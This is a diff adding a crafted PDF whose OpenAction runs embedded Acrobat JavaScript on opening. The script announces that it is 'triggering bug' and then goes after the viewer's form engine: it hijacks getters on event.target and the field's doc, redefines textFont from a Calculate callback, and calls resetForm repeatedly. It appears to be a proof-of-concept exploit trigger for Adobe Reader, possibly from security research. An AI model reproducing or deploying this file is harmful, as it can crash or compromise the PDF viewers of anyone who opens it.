@@ -1,0 +1,201 @@
+%PDF-1.7
+
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/AcroForm 4 0 R
+/OpenAction 6 0 R
+>>
+endobj
+
+2 0 obj
+<<
+/Type /Pages
+/Count 1
+/Kids [3 0 R]
+>>
+endobj
+
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/Annots [5 0 R]
+>>
+endobj
+
+4 0 obj
+<<
+/Fields [5 0 R]
+/XFA [
+    (xdp:xdp) 10 0 R
+    (form) 11 0 R
+    (</xdp:xdp>) 12 0 R
+]
+>>
+endobj
+
+5 0 obj
+<<
+/Type /Annot
+/Subtype /Widget
+/T (testfield)
+/FT /Tx
+/Rect [0 0 0 0]
+>>
+
+endobj
+
+6 0 obj
+<<
+/Type /Action
+/S /JavaScript
+/JS 7 0 R
+>>
+endobj
+
+7 0 obj
+<< /Length 855 >>
+stream
+console.show();
+
+var chunks = [];
+var bufs = []; 
+var arrs = []; 
+
+function PropAccClosure(obj, prop) 
+{
+    obj = obj;
+    prop = prop;
+    return function() { return obj[prop]; }
+}
+
+console.println("[*] triggering bug...");
+
+var f0 = this.getField("testfield");
+f0.richText = true;
+f0.setAction("Calculate", "callback0()");
+
+// override popups
+try { Object.defineProperty(this['Collab'], "defaultStore", { enumerable:false }); } catch(e) { }
+
+var mythis = {};
+for (var k in this) {
+  if (k == "URL" || k == "bookmarkRoot" || k == "ptrs" || k == "arrs" || k == "bufs")
+    continue;
+  mythis[k] = 0;
+  mythis.__defineGetter__(k, PropAccClosure(this, k));
+}
+
+event.target = mythis;
+f0.__defineGetter__('doc', function() { return mythis; });
+
+// trigger bug
+try { this.resetForm(); } catch (e) {}
+try { this.resetForm(); } catch (e) {}
+
+function callback0()
+{
+    event.__defineGetter__('target', func_0);
+    event.richValue = mythis;
+}
+
+function func_0()
+{
+    try { Object.defineProperty(f0, "textFont", { value: this }); } catch(e) { }
+}
+
+endstream
+endobj
+
+8 0 obj
+<< /Parent 2 0 R
+/Resources <<
+/Font <<
+    /F1 <<
+        /Type /Font
+        /Subtype /Type1
+        /BaseFont /Helvetica
+        /Name /F1
+    >>
+>>
+>>
+/Type /Page
+/MediaBox [ 0 0 795 842 ]
+>>
+endobj
+
+9 0 obj
+<< /Parent 2 0 R
+/Resources <<
+/Font <<
+    /F1 <<
+        /Type /Font
+        /Subtype /Type1
+        /BaseFont /Helvetica
+        /Name /F1
+    >>
+>>
+>>
+/Type /Page
+/MediaBox [ 0 0 795 842 ]
+>>
+endobj
+
+10 0 obj
+<< /Length 89 >>
+stream
+<?xml version="1.0" encoding="UTF-8"?>
+    <xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+endstream
+endobj
+
+11 0 obj
+<< /Length 364 >>
+stream
+
+<template id="template0"> 
+<subform id="subform0" name="subform0">
+    <pageSet>
+        <pageArea id="Page-HC0" name="Page-HC0">
+            <contentArea h="10.5in" w="8in" x="0.25in" y="0.25in"/>
+            <medium long="11in" short="8.5in" stock="letter"/>
+        </pageArea>
+    </pageSet>
+</subform>
+</template>
+
+endstream
+endobj
+
+12 0 obj
+<< /Length 10 >>
+stream
+</xdp:xdp>
+endstream
+endobj
+
+xref
+0 13
+0000000000 65535 f 
+0000000010 00000 n 
+0000000094 00000 n 
+0000000164 00000 n 
+0000000228 00000 n 
+0000000338 00000 n 
+0000000550 00000 n 
+0000000611 00000 n 
+0000001518 00000 n 
+0000001730 00000 n 
+0000001942 00000 n 
+0000002083 00000 n 
+0000002500 00000 n 
+trailer
+<<
+ /Size 13
+ /Root 1 0 R
+>>
+startxref
+2562
+%%EOF
